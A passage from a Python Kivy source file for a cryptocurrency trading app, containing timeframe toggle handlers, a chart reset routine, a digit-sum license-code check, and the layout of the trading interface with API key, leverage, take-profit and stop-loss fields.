        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget22.state=="down":
                self.grafica=self.comptiempoactual[4]
                self.TIPOVELA="1hour"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="down"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle6(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget23.state=="down":
                self.grafica=self.comptiempoactual[5]
                self.TIPOVELA="4hour"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="down"
                self.widget24.state="normal"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle7(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget24.state=="down":
                self.grafica=self.comptiempoactual[6]
                self.TIPOVELA="1day"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="down"
                self.widget25.state="normal"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
    def on_toggle8(self, instance):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            if self.widget25.state=="down":
                self.grafica=self.comptiempoactual[7]
                self.TIPOVELA="1week"
            else:
                self.widget18.state="normal"
                self.widget19.state="normal"
                self.widget20.state="normal"
                self.widget21.state="normal"
                self.widget22.state="normal"
                self.widget23.state="normal"
                self.widget24.state="normal"
                self.widget25.state="down"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------             
    def on_spinner_select(self, spinner, text):
        if self.call_conador_operacion==0 and self.call_conador_operacionp==0 and self.rev_wait==0:
            self.graficaSSS=self.spinner.text
        else:
            self.spinner.text=self.graficaSSS 
    def on_focus_change(self, instance, focused):
        #""" Ejecuta la validación al perder el foco. """
        if not focused:  # Si `focused` es False, significa que perdió el foco
            self.validar_valor(instance)
    def validar_valor(self, instance):
        try:
            valor = float(self.spinner_20.text)
            self.valor_actual = self.leer_valor()
            if valor > self.valor_actual:
                self.spinner_20.text = "2"
            else:
                None
        except ValueError:
            self.spinner_20.text = "2"
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------              
    def detener_funciones_corriendo(self, dt):
        if self.grafica_a_manejar_comprobador==self.grafica and self.grafica_a_manejar_comprobadorSSS==self.graficaSSS:
            None
        else:
            self.pivot_possible_pred_list.clear()
            self.pivot_possible_pred_list1.clear() 
            self.widget15_2333.background_color=color_botones
            self.widget15_2333xxx.trigger_action()  
            self.Inversionttt=0
            self.Precio_entradattt=0
            self.Direccion_entradattt=0
            self.Apalancamiento_entradattt=0
            try:
                self.compra_call_line.remove()
                self.compra_call_entrada.remove()                
                del self.compra_call_line
                del self.compra_call_entrada
            except:
                None
            self.call_conador_operacion=0
            self.call_conador_operacionp=0
            self.limite_stopc=0
            self.limite_takec=0
            self.limite_stopp=0
            self.limite_takep=0
            self.iniciarcalculo_call_put=0
            self.grafica_a_manejar_comprobador=self.grafica
            self.grafica_a_manejar_comprobadorSSS=self.graficaSSS
            self.grafica=self.grafica_a_manejar_comprobador
            self.graficaSSS=self.grafica_a_manejar_comprobadorSSS            
            self.apagar_funciones="si apagar funciones"           
            self.ax.cla()
            #self.ax25.cla()
            #self.ax26.cla()
            gc.collect()                                    
            self.idinicio1="no paso"
            self.idinicio2="no paso"
            self.contadorpoli= 0       
            self.utimopivot= 0         
            self.contol_precio= 0
            self.contol_preciox= 0
            self.ValordeYmarcador= 0
            self.ValordeX1marcador= 0
            self.terminacionejexxx= 160.5
            self.hdahdahcontador= 0      
            self.precio_anterior_comparar= "no registrado"
            self.color_ant="blue"
            self.continuidadtendencia1="Neutral"
            self.openvela1=0          
            self.open_prices.clear()
            self.close_prices.clear()
            self.high_prices.clear()
            self.low_prices.clear()
            self.id_velas.clear()
            self.lista_poligonos.clear()
            self.x1l.clear()
            self.y1l.clear()
            self.x2l.clear()
            self.y2l.clear()
            self.x3l.clear()
            self.y3l.clear()
            self.x4l.clear()
            self.y4l.clear()
            self.x5l.clear()
            self.y5l.clear()
            self.x6l.clear()
            self.y6l.clear()
            self.x7l.clear()
            self.y7l.clear()
            self.x8l.clear()
            self.y8l.clear()
            self.x13l.clear()
            self.y13l.clear()
            self.x16l.clear()
            self.y16l.clear()
            self.x19l.clear()
            self.y19l.clear()
            self.x112l.clear()
            self.y112l.clear()
            self.resistencia_crestaszz.clear()
            self.interaciones_resistenciazz.clear()
            self.soporte_valleszz.clear()
            self.interaciones_soportezz.clear()
            self.R1 =  0
            self.R2 =  0
            self.S1 =  0
            self.S2 =  0
            self.XR1=  0
            self.XR2=  0
            self.XS1=  0
            self.XS2=  0                                 
            #datos para representacion inicial todas las velas japonesas en el grafico-------------------
            self.linea_precio_TR= self.ax.axhline(y=0, color="blue", zorder=999,linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.linea_Valor_precio_TR= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',zorder=1000,  ha='right', bbox=dict(facecolor="white", edgecolor="white", boxstyle='round4'))
            #precio clave
            self.precioclave222xxx= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.precioclave222= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="white", boxstyle='round4'))            
            self.precioclave222xxx111= self.ax.axhline(y=0, color="blue", linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)
            self.precioclave222111= self.ax.text(self.terminacionejexxx-self.xdespl,0,0,color ="white", fontweight = "normal",fontsize=self.tamanio_letra,va='center',  ha='right', bbox=dict(facecolor="blue",alpha=0.7, edgecolor="white", boxstyle='round4'))
            #movimiento mouse------------------------------------------------------
            self.linexkx = self.ax.axhline(y=0,color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)            
            self.vlinex = self.ax.axvline(x=0, color=self.color_cruz, linestyle=self.estilo_linea3, linewidth=self.grosor_linea3)           
            self.textxkx = self.ax.text(0, 0, 0,color ="white", fontname=self.estilo_letra, fontsize=self.tamanio_letra,va="bottom", ha='left', bbox=dict(facecolor="black", edgecolor="black", boxstyle='round4'))
            self.color_1,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
            self.color_2,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
            self.color_3,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
            self.color_3YY,=self.ax.plot(0,0,marker='s', markersize=self.flec, linestyle='None')
            self.color_4,=self.ax.plot(0,0, linestyle='None')                            
            self.linea_1ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
            self.linea_4ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                
            self.linea_7ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_7ax1, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_10ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_10ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_13ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
            self.linea_16ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_19ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_19ax1, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_22ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_22ax6, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_4444ax, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_1666ax, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_10ax22, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_7axxx, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                                     
            self.linea_7axZZZ, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)             
            self.linea_19axzz, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)               
            self.linea_x111, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea33)
            self.linea_7axqq, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3) 
            self.linea_7axqqmas, = self.ax.plot([0,0],[0,0], color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.linea_7axe, = self.ax.plot([0,0],[0,0], color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                 
            self.xyR3_1 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
            self.rect_R3_1 = Polygon(self.xyR3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
            self.ax.add_patch(self.rect_R3_1)
            self.xyS3_1 = [(0, 0),(0, 0),(0, 0),(0, 0)]
            self.rect_S3_1 = Polygon(self.xyS3_1, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
            self.ax.add_patch(self.rect_S3_1)
            self.xyS3_2 = [(0, 0),(0, 0),(0, 0),(0, 0)]
            self.rect_S3_2 = Polygon(self.xyS3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='g', alpha=0.3)
            self.ax.add_patch(self.rect_S3_2)
            self.xyR3_2 = [ (0, 0),(0, 0),(0, 0),(0, 0)]
            self.rect_R3_2 = Polygon(self.xyR3_2, closed=True, linewidth=self.grosor_linea3, edgecolor='w', facecolor='r', alpha=0.3)
            self.ax.add_patch(self.rect_R3_2)                
            self.grfresisteb,=self.ax.plot(0,0, color="r",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)
            self.grfsoporteb,=self.ax.plot(0,0, color="g",linestyle=self.estilo_linea3,linewidth=self.grosor_linea3)                                                 
            
            #--------------------------------------------------------------------------------------------------------------------------------------------------------------
            try:
                if hasattr(self, 'detener_funciones_1'):
                    Clock.unschedule(self.detener_funciones_1)
                    self.detener_funciones_1=0                    
            except:
                None
            try:
                if hasattr(self, 'detener_funciones_2'):
                    Clock.unschedule(self.detener_funciones_2)
                    self.detener_funciones_2=0                    
            except:
                None
            Clock.schedule_once(self.hacer_lista)            
            self.figz.canvas.draw_idle()    
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
    def dfadadasdadsad(self, instance):
        try:
            codigo1=self.widget4.text                       
            name_entry_3=self.widget3.text
            len_usuario=len(name_entry_3)
            len_codigo=len(codigo1)
            reb_codigo=int(codigo1[13])
            reb_codigo1=int(codigo1[14])
            num_reb_codigo=reb_codigo*10+reb_codigo1
            reb_codigo_0=int(codigo1[0])
            reb_codigo_1=int(codigo1[1])
            reb_codigo_2=int(codigo1[2])
            suma_reb_codigo_1=reb_codigo_0+reb_codigo_1+reb_codigo_2
            suma_reb_codigo_10=(reb_codigo_0*10+reb_codigo_1)*10+reb_codigo_2
            reb_codigo_3=int(codigo1[3])
            reb_codigo_4=int(codigo1[4])
            reb_codigo_5=int(codigo1[5])
            suma_reb_codigo_2=reb_codigo_3+reb_codigo_4+reb_codigo_5
            suma_reb_codigo_20=(reb_codigo_3*10+reb_codigo_4)*10+reb_codigo_5
            reb_codigo_6=int(codigo1[6])
            reb_codigo_7=int(codigo1[7])
            reb_codigo_8=int(codigo1[8])
            suma_reb_codigo_3=reb_codigo_6+reb_codigo_7+reb_codigo_8
            suma_reb_codigo_30=(reb_codigo_6*10+reb_codigo_7)*10+reb_codigo_8
            reb_codigo_9=int(codigo1[9])
            reb_codigo_10=int(codigo1[10])
            reb_codigo_11=int(codigo1[11])
            suma_reb_codigo_4=reb_codigo_9+reb_codigo_10+reb_codigo_11
            suma_reb_codigo_40=(reb_codigo_9*10+reb_codigo_10)*10+reb_codigo_11
            reb_codigo_15=int(codigo1[15])
            reb_codigo_16=int(codigo1[16])
            reb_codigo_17=int(codigo1[17])
            suma_reb_codigo_6=reb_codigo_15+reb_codigo_16+reb_codigo_17
            suma_reb_codigo_60=(reb_codigo_15*10+reb_codigo_16)*10+reb_codigo_17
            if suma_reb_codigo_10 % 2 == 0:
                ver_paridad_o_inparidad_suma_reb_codigo_1="par"
            else:
                ver_paridad_o_inparidad_suma_reb_codigo_1="impar"
            if suma_reb_codigo_20 % 2 == 0:
                ver_paridad_o_inparidad_suma_reb_codigo_2="par"
            else:
                ver_paridad_o_inparidad_suma_reb_codigo_2="impar"
            if suma_reb_codigo_30 % 2 == 0:
                ver_paridad_o_inparidad_suma_reb_codigo_3="par"
            else:
                ver_paridad_o_inparidad_suma_reb_codigo_3="impar"
            if suma_reb_codigo_40 % 2 == 0:
                ver_paridad_o_inparidad_suma_reb_codigo_4="par"
            else:
                ver_paridad_o_inparidad_suma_reb_codigo_4="impar"
            if suma_reb_codigo_60 % 2 == 0:
                ver_paridad_o_inparidad_suma_reb_codigo_6="par"
            else:
                ver_paridad_o_inparidad_suma_reb_codigo_6="impar"
            if len_codigo==18:
                validacion_1= "valida"
            else:
                validacion_1= "no valida"
            if num_reb_codigo==len_usuario:
                validacion_2= "valida"
            else:
                validacion_2= "no valida"
            if suma_reb_codigo_1==5 or suma_reb_codigo_1==1 or suma_reb_codigo_1==7 or suma_reb_codigo_1==16:
                validacion_3_0= "valida"
            else:
                validacion_3_0= "no valida"
            if suma_reb_codigo_2==4 or suma_reb_codigo_2==12 or suma_reb_codigo_2==7 or suma_reb_codigo_2==18 or suma_reb_codigo_2==20 :
                validacion_3_1= "valida"
            else:
                validacion_3_1= "no valida"
            if suma_reb_codigo_3==6 or suma_reb_codigo_3==23 or suma_reb_codigo_3==13 or suma_reb_codigo_3==3 or suma_reb_codigo_3==9 :
                validacion_3_2= "valida"
            else:
                validacion_3_2= "no valida"
            if suma_reb_codigo_4==4 or suma_reb_codigo_4==16 or suma_reb_codigo_4==19 or suma_reb_codigo_4==1 or suma_reb_codigo_4==7 :
                validacion_3_3= "valida"
            else:
                validacion_3_3= "no valida"
            if suma_reb_codigo_6==6 or suma_reb_codigo_6==23 or suma_reb_codigo_6==9 or suma_reb_codigo_6==13 or suma_reb_codigo_6==3 :
                validacion_3_5= "valida"
            else:
                validacion_3_5= "no valida"
            if validacion_1=="valida" and  validacion_2=="valida" and validacion_3_0== "valida" and validacion_3_1=="valida" and validacion_3_2== "valida" and  validacion_3_3== "valida" and  validacion_3_5== "valida" and ver_paridad_o_inparidad_suma_reb_codigo_1=="par" and ver_paridad_o_inparidad_suma_reb_codigo_2=="impar" and ver_paridad_o_inparidad_suma_reb_codigo_3=="impar" and ver_paridad_o_inparidad_suma_reb_codigo_4=="par" and ver_paridad_o_inparidad_suma_reb_codigo_6=="par":                               
                self.main_layout.clear_widgets()            
                self.widget18 = ToggleButton(text='1min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,state="down") 
                self.widget19 = ToggleButton(text='5min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget20 = ToggleButton(text='15min',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget21 = ToggleButton(text='30min',group='opciones1',  background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget22 = ToggleButton(text='1hour',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget23 = ToggleButton(text='4hour',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget24 = ToggleButton(text='1day',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget25 = ToggleButton(text='1week',group='opciones1', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                #self.widget26 = ToggleButton(text='1month',group='opciones1', background_normal='',background_color=a8,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner = Spinner(
                text="BTCUSDT",
                values=("BTCUSDT","ETHUSDT","LTCUSDT","XRPUSDT","OPUSDT","TRXUSDT","BCHUSDT","EOSUSDT","BNBUSDT","ADAUSDT","DOGEUSDT","DOTUSDT","LINKUSDT","XLMUSDT","AVAXUSDT","SOLUSDT","UNIUSDT","ATOMUSDT","VETUSDT","AAVEUSDT"),font_size=self.TAMAÑO_TEXTOS,font_name=self.estilo_letra,            
                size=(15, 15))                
                self.spinner.bind(text=self.on_spinner_select)               
                self.widget18.bind(on_press=self.on_toggle1)
                self.widget19.bind(on_press=self.on_toggle2) 
                self.widget20.bind(on_press=self.on_toggle3) 
                self.widget21.bind(on_press=self.on_toggle4) 
                self.widget22.bind(on_press=self.on_toggle5)
                self.widget23.bind(on_press=self.on_toggle6) 
                self.widget24.bind(on_press=self.on_toggle7)
                self.widget25.bind(on_press=self.on_toggle8)      
                widget15 = Button(text='Close application', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                widget15.bind(on_press=self.close_app)                
                self.widget15_1 = Button(text="Call\n(0)", background_normal='',background_color="green", halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_1.bind(on_press=self.Comprar_call)
                self.widget15_2 = Button(text='Put\n(0)',background_normal='',background_color="red", halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_2.bind(on_press=self.Comprar_put)                
                self.widget15_2333 = Button(text='Robot\n(OFF)', background_normal='',background_color=color_botones, halign='center', valign='middle' , color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget15_2333.bind(on_press=self.AUTO)
                self.widget15_2333xxx = Button(text='Stop', background_normal='',background_color=color_botones,  color=(1, 1, 1, 1),font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra) 
                self.widget15_2333xxx.bind(on_press=self.Detener_operaciones)    
                Contenedor_1a = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)               
                #Contenedor_1a.add_widget(self.spinner)
                Contenedor_1a.add_widget(self.widget18)
                Contenedor_1a.add_widget(self.widget19)
                Contenedor_1a.add_widget(self.widget20)
                Contenedor_1a.add_widget(self.widget21)
                Contenedor_1a.add_widget(self.widget22)
                Contenedor_1a.add_widget(self.widget23)
                Contenedor_1a.add_widget(self.widget24)
                Contenedor_1a.add_widget(self.widget25)
                Contenedor_operaciones = BoxLayout(orientation='horizontal', size_hint=(0.045, 1),spacing=3)                                
                Contenedor_operaciones1 = BoxLayout(orientation='vertical', size_hint=(1, 1),spacing=3)    
                self.main_layout.add_widget(Contenedor_1a)
                self.Contenedor_22aqqqttt = BoxLayout(orientation='horizontal',size_hint=(1, 1))
                self.Contenedor_22aqqq = BoxLayout(orientation='horizontal',size_hint=(1, 1)) 
                self.widget100looo0xxx = Label(color=(1, 1, 1, 1),text='API key:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo1xxx = Label(color=(1, 1, 1, 1),text='Secret Key:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner_22XXX = TextInput(
                    multiline=False,
                    halign='center',hint_text="key",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                self.spinner_22XXX1 = TextInput(
                    multiline=False,
                    halign='center',hint_text="key",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones) 
                img_datax = base64.b64decode(self.img_base64_2)
                image_streamx = io.BytesIO(img_datax)
                core_imagex = CoreImage(image_streamx, ext='png')  # Cambia 'png' si es otro formato
                img_widgetx = Image()
                img_widgetx.texture = core_imagex.texture        
                self.widget1xxxxxx = img_widgetx
                self.widget100looo0 = Label(color=(1, 1, 1, 1),text='Investment:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo1 = Label(color=(1, 1, 1, 1),text='Leverage:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo2 = Label(color=(1, 1, 1, 1),text='Take profit:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo3 = Label(color=(1, 1, 1, 1),text='Stop loss:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget100looo4 = Label(color=(1, 1, 1, 1),text='Fee:',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.spinner_20auto = Spinner(text='0.0002',  # Valor inicial del spinner
                    values=["0.0001", "0.0002", "0.0003", "0.0004", "0.0005","0.0006","0.0007"],  # Valores disponibles para seleccionar
                    size=(15, 15),
                    font_size=self.TAMAÑO_TEXTOS,
                    font_name=self.estilo_letra,
                    background_normal='',
                    background_color=color_botones
                )                                       
                self.spinner_20 = self.spinner_20 = TextInput(text="2",hint_text="Value",input_filter="float",multiline=False,halign='center',hint_text_color=[1, 1, 1, 1],foreground_color=[1, 1, 1, 1],font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                self.spinner_20.bind(focus=self.on_focus_change)
                valores_permitidos = [str(i) for i in range(10, 101, 10)]  # [10, 20, 30, ..., 100]
                self.spinner_21 = Spinner( text='10',values=valores_permitidos,  size=(15, 15) ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones)
                # Función para validar que solo se ingresen números y un solo punto
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
                def solo_numeros_y_un_punto(texto, desde_undo=False):
                    nuevo_texto = []
                    punto_count = 0  # Contador para asegurar que solo haya un punto
                    for c in texto:
                        if c.isdigit():  # Permite dígitos (0-9)
                            nuevo_texto.append(c)
                        elif c == '.' and punto_count == 0:  # Permite solo un punto
                            nuevo_texto.append(c)
                            punto_count += 1
                    return ''.join(nuevo_texto)
                
                # Crear el TextInput que solo admite números y un separador decimal
                self.spinner_22 = TextInput(
                    multiline=False,
                    halign='center',hint_text="Value",hint_text_color=[1, 1, 1, 1], foreground_color=[1, 1, 1, 1]
                    ,font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones,
                    input_filter=solo_numeros_y_un_punto  # Filtro para números y un separador decimal
                )
#--------------------------------------------------------------------------------------------------------------------------------------------------------------------------                
                def solo_numeros_y_un_punto1(texto2, desde_undo=False):
                    nuevo_texto2 = []
                    punto_count = 0  # Contador para asegurar que solo haya un punto
                    for c in texto2:
                        if c.isdigit():  # Permite dígitos (0-9)
                            nuevo_texto2.append(c)
                        elif c == '.' and punto_count == 0:  # Permite solo un punto
                            nuevo_texto2.append(c)
                            punto_count += 1
                    return ''.join(nuevo_texto2)
                #-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- 
                # Crear el TextInput que solo admite números y un separador decimal
                self.spinner_23 = TextInput(
                    multiline=False,
                    halign='center',hint_text="Value",hint_text_color=[1, 1, 1, 1],foreground_color=[1, 1, 1, 1],font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra,background_normal='', background_color=color_botones,
                    input_filter=solo_numeros_y_un_punto1 # Filtro para números y un separador decimal
                )                
                self.Contenedor_22afff111 = BoxLayout(orientation='horizontal', size_hint=(1, self.anch_boton),spacing=3)
                self.Contenedor_22afff = BoxLayout(orientation='vertical',size_hint=(1, 0.1))
                self.widget999991 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs1,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999992 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs2,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999993 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs3,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999994 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs4,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999995 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs5,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999996 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs6,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999997 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs7,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.widget999998 = Label(color=(1, 1, 1, 1),text=self.skfkjsdkfjs8,size_hint_x=1,  halign='left', valign='middle',font_size=self.TAMAÑO_TEXTOS, font_name=self.estilo_letra)
                self.Contenedor_22aqqqttt.add_widget(self.widget1xxxxxx)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo0xxx)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22XXX)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo1xxx)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22XXX1)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo0)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_20)                
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo2)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_22)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo3)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_23)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo1)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_21)
                self.Contenedor_22aqqqttt.add_widget(self.widget100looo4)
                self.Contenedor_22aqqqttt.add_widget(self.spinner_20auto)             
                self.Contenedor_22aqqq.add_widget(self.widget999991)
                self.Contenedor_22aqqq.add_widget(self.widget999992)
                self.Contenedor_22aqqq.add_widget(self.widget999993)
                self.Contenedor_22aqqq.add_widget(self.widget999994)
                self.Contenedor_22aqqq.add_widget(self.widget999995)
                self.Contenedor_22aqqq.add_widget(self.widget999996)
                self.Contenedor_22aqqq.add_widget(self.widget999997)
                self.Contenedor_22aqqq.add_widget(self.widget999998)
                self.Contenedor_22afff111.add_widget(self.Contenedor_22aqqqttt)                            
                self.Contenedor_22afff.add_widget(self.Contenedor_22aqqq)
                #self.main_layout.add_widget(self.Contenedor_22afff111)
                #self.main_layout.add_widget(self.Contenedor_22afff)
                self.Contenedor_2a = BoxLayout(orientation='horizontal', size_hint=(1, 1))
                self.figura_guardada = BoxLayout(orientation='horizontal', size_hint=(1, 1))
                self.figz = Figure(figsize=(12, 12), dpi=100,facecolor=self.colorall)            
                self.figz.subplots_adjust(left=self.izquierdag, right=self.derechag, top=1, bottom=0)
                self.ax = self.figz.add_subplot(111, facecolor= self.colorall) 
                self.ax.spines['top'].set_visible(False)    # Elimina el borde superior
                self.ax.spines['right'].set_visible(False)  # Elimina el borde derecho
                self.ax.spines['bottom'].set_visible(False) # Elimina el borde inferior
                self.ax.spines['left'].set_visible(False)   # Elimina el borde izquierdo
                
                      
                # Establecer el tamaño y estilo de la fuente para los valores de los ejes
                self.ax.tick_params(axis='x', labelsize=self.tamanio_valores, labelcolor='none', which='major')
                self.ax.tick_params(axis='y', labelsize=self.tamanio_valores, labelcolor='white', which='major')
                self.ax.grid(False) 
                self.ax.xaxis.label.set_color('white')  # Color de la etiqueta del eje X
                self.ax.yaxis.label.set_color('white')  # Color de la etiqueta del eje Y
